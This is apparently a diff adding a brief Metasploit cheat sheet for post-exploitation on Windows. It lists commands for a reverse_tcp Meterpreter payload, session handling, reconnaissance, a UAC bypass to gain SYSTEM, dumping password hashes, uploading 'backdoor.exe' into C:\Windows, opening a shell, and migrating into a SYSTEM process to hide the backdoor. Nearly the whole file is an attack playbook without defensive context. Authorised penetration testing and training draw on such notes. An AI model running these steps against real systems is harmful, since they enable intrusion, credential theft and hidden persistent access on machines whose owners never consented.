@@ -1,0 +1,43 @@
+msfconsole
+>search meterpreter
+
+>set payload windows/meterpreter/reverse_tcp
+
+>background
+>sessions -l
+>sessions -i <number>
+
+Get info about target
+>sysinfo
+>ifconfig
+>route
+>getuid
+>getsystem (won't work in modern windows, need to bypass uac)
+	>run post/windows/gather/win_privs
+	>search bypassuac
+	>use exploit/windows/local/bypassuac
+	>set session
+	>exploit
+	>getsystem
+
+navigate hdd
+>pwd
+>ls
+>cd
+
+Dump passwdhashes
+>background
+>use post/windows/gather/hashdump
+>set session <number>
+>exploit
+
+Download / upload
+>download logs.txt /root/
+>upload /root/backdoor.exe C:\\Windows
+
+Run standard shell
+>shell
+
+Hide backdoor
+>ps -U SYSTEM
+>migrate <PID>
